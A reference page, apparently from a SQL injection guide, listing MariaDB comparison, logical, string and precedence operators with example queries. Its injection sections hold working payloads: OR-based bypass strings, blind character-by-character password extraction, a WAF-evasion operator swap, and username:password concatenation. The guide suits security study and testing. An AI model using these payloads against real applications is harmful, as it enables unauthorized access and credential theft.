---
title: Operators
description: MariaDB operators useful for SQL injection techniques
category: Reference
order: 21
tags: ["operators", "comparison", "logical", "reference"]
lastUpdated: 2025-12-18
---

## Operators

Understanding MariaDB operators is essential for crafting effective SQL injection payloads. This reference covers the most useful operators for SQL injection techniques.

### Comparison Operators

| Operator      | Description           | Example                                             |
| ------------- | --------------------- | --------------------------------------------------- |
| `=`           | Equal                 | `SELECT * FROM users WHERE id = 1`                  |
| `<=>`         | NULL-safe equal       | `SELECT NULL <=> NULL` (returns 1, unlike `=`)      |
| `<>` or `!=`  | Not equal             | `SELECT * FROM users WHERE id <> 1`                 |
| `>`           | Greater than          | `SELECT * FROM users WHERE id > 1`                  |
| `>=`          | Greater than or equal | `SELECT * FROM users WHERE id >= 1`                 |
| `<`           | Less than             | `SELECT * FROM users WHERE id < 10`                 |
| `<=`          | Less than or equal    | `SELECT * FROM users WHERE id <= 10`                |
| `BETWEEN`     | Between range         | `SELECT * FROM users WHERE id BETWEEN 1 AND 10`     |
| `IS NULL`     | Null check            | `SELECT * FROM users WHERE email IS NULL`           |
| `IS NOT NULL` | Not null check        | `SELECT * FROM users WHERE email IS NOT NULL`       |
| `LIKE`        | Pattern matching      | `SELECT * FROM users WHERE name LIKE 'a%'`          |
| `NOT LIKE`    | Negated pattern match | `SELECT * FROM users WHERE name NOT LIKE 'a%'`      |
| `REGEXP`      | Regular expression    | `SELECT * FROM users WHERE name REGEXP '^a'`        |
| `NOT REGEXP`  | Negated regex match   | `SELECT * FROM users WHERE name NOT REGEXP '^a'`    |
| `RLIKE`       | Alias for REGEXP      | `SELECT * FROM users WHERE name RLIKE '^a'`         |
| `SOUNDS LIKE` | Phonetic comparison   | `SELECT * FROM users WHERE name SOUNDS LIKE 'john'` |
| `IN`          | In set                | `SELECT * FROM users WHERE id IN (1,2,3)`           |

#### NULL-Safe Equal Operator (<=>)

The `<=>` operator treats NULL as a comparable value:

```sql
-- Regular equal: NULL = NULL returns NULL (unknown)
SELECT (NULL = NULL) AS result  -- Returns: NULL

-- NULL-safe equal: NULL <=> NULL returns 1 (true)
SELECT (NULL <=> NULL) AS result  -- Returns: 1

-- Comparing value with NULL
SELECT (1 <=> NULL) AS result  -- Returns: 0 (false)
```

### Logical Operators

| Operator       | Description | Example                                              |
| -------------- | ----------- | ---------------------------------------------------- |
| `AND` or `&&`  | Logical AND | `SELECT * FROM users WHERE active=1 AND admin=1`     |
| `OR` or `\|\|` | Logical OR  | `SELECT * FROM users WHERE id=1 OR username='admin'` |
| `NOT` or `!`   | Logical NOT | `SELECT * FROM users WHERE NOT id=1`                 |
| `XOR`          | Logical XOR | `SELECT * FROM users WHERE id=1 XOR admin=1`         |

#### XOR Behavior

XOR returns true when exactly one operand is true:

```sql
SELECT (1 XOR 0) AS result  -- Returns: 1 (one true)
SELECT (1 XOR 1) AS result  -- Returns: 0 (both true)
SELECT (0 XOR 0) AS result  -- Returns: 0 (both false)
```

#### Alternative NOT Syntax

The `!` operator can be used as prefix notation:

```sql
-- Standard NOT
SELECT * FROM users WHERE NOT id = 1

-- Alternative with ! and parentheses
SELECT * FROM users WHERE !(id = 1)
```

### Mathematical Operators

Basic arithmetic operators (`+`, `-`, `*`, `/`, `DIV`, `%`, `MOD`) are available for injection payloads when needed for calculations or obfuscation. For detailed arithmetic documentation, refer to MariaDB official docs.

```sql
-- Example: Using arithmetic in injection
' OR id=5-2 -- -  -- id=3
' OR LENGTH(password)>5+5 -- -  -- password length > 10
```

### Bitwise Operators

Bitwise operators (`&`, `|`, `^`, `<<`, `>>`, `~`) are rarely used in SQL injection but available for advanced obfuscation. For complete bitwise operator documentation, refer to MariaDB official docs.

### Assignment Operators

| Operator | Description      | Example         |
| -------- | ---------------- | --------------- |
| `:=`     | Value assignment | `SET @var := 1` |

#### Using Variables in Queries

Variables can be assigned and used within the same query:

```sql
-- Assign and use in same query
SELECT @var := 10, @var * 2 AS doubled  -- Returns: 10, 20

-- Use in injection for state tracking
SELECT @row := @row + 1 AS row_num, username FROM users, (SELECT @row := 0) r
```

### String Operators

| Operator      | Description                  | Example                                                  |
| ------------- | ---------------------------- | -------------------------------------------------------- |
| `CONCAT()`    | String concatenation         | `SELECT CONCAT(first_name, ' ', last_name) FROM users`   |
| `CONCAT_WS()` | Concatenation with separator | `SELECT CONCAT_WS('-', 'a', 'b', 'c')` (returns 'a-b-c') |

#### CONCAT vs CONCAT_WS NULL Handling

`CONCAT()` returns NULL if any argument is NULL, while `CONCAT_WS()` skips NULL values:

```sql
-- CONCAT with NULL returns NULL
SELECT CONCAT('a', NULL, 'c') AS result  -- Returns: NULL

-- CONCAT_WS with NULL skips the NULL
SELECT CONCAT_WS('-', 'a', NULL, 'c') AS result  -- Returns: 'a-c'
```

This difference is useful when extracting data that might contain NULL columns. Use `CONCAT_WS()` when you want to ignore NULL values in concatenation.

### Usage in SQL Injection

#### Boolean-Based Blind Injection

```sql
-- Testing if admin exists
' OR EXISTS(SELECT * FROM users WHERE username='admin') -- -

-- Character by character extraction
' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 -- -
```

#### Operator Precedence Exploitation

Operators follow a precedence order that can be exploited:

```sql
-- AND has higher precedence than OR
1=0 OR 1=1 AND 2=2 -- True because (1=1 AND 2=2) evaluates first

-- Using parentheses to control evaluation order
1=0 OR (1=1 AND 2=2) -- True
(1=0 OR 1=1) AND 2=2 -- True
```

#### Alternative Operator Forms

Using alternative forms can help bypass WAF filters:

```sql
-- Standard form
SELECT * FROM users WHERE id=1 OR username='admin'

-- Alternative form
SELECT * FROM users WHERE id=1 || username='admin'
```

#### Practical Examples in Injections

```sql
-- Using NOT to invert conditions
' OR NOT 2=3 -- -

-- Using IN for multiple values
' OR username IN ('admin','root') -- -

-- Using LIKE for pattern matching
' OR username LIKE 'adm%' -- -

-- Using BETWEEN for range checking
' OR id BETWEEN 1 AND 5 -- -

-- Data extraction with CONCAT
SELECT id, CONCAT(username, ':', password) AS creds FROM users
```

### Truth Table for Logical Operators

| Expr1 | Expr2 | AND   | OR    | XOR   |
| ----- | ----- | ----- | ----- | ----- |
| TRUE  | TRUE  | TRUE  | TRUE  | FALSE |
| TRUE  | FALSE | FALSE | TRUE  | TRUE  |
| FALSE | TRUE  | FALSE | TRUE  | TRUE  |
| FALSE | FALSE | FALSE | FALSE | FALSE |
| NULL  | TRUE  | NULL  | TRUE  | NULL  |
| TRUE  | NULL  | NULL  | TRUE  | NULL  |
| FALSE | NULL  | FALSE | NULL  | NULL  |
| NULL  | FALSE | FALSE | NULL  | NULL  |
| NULL  | NULL  | NULL  | NULL  | NULL  |

### Operator Precedence in MariaDB

From highest to lowest:

1. `INTERVAL`
2. `BINARY`, `COLLATE`
3. `!` (logical NOT - unary)
4. `-` (unary minus), `~` (bitwise NOT)
5. `||` (string concatenation, when `PIPES_AS_CONCAT` SQL mode is enabled)
6. `^` (bitwise XOR)
7. `*`, `/`, `DIV`, `%`, `MOD`
8. `-`, `+` (binary arithmetic)
9. `<<`, `>>`
10. `&`
11. `|`
12. `=`, `<=>`, `>=`, `>`, `<=`, `<`, `<>`, `!=`, `IS`, `LIKE`, `REGEXP`, `IN`
13. `BETWEEN`, `CASE`, `WHEN`, `THEN`, `ELSE`
14. `NOT`
15. `AND`, `&&`
16. `XOR`
17. `OR`, `||` (logical OR, default behavior)
18. `:=`, `=` (assignment, lowest)

#### Precedence Examples

```sql
-- AND before OR: 1=0 OR 1=1 AND 2=2 evaluates as 1=0 OR (1=1 AND 2=2)
SELECT (1=0 OR 1=1 AND 2=2) AS result  -- Returns: 1

-- XOR before OR: 1 OR 0 XOR 1 = 1 OR (0 XOR 1) = 1 OR 1 = 1
SELECT (1 OR 0 XOR 1) AS result  -- Returns: 1
```

Understanding operator precedence is crucial for crafting complex injection payloads where conditions are combined.
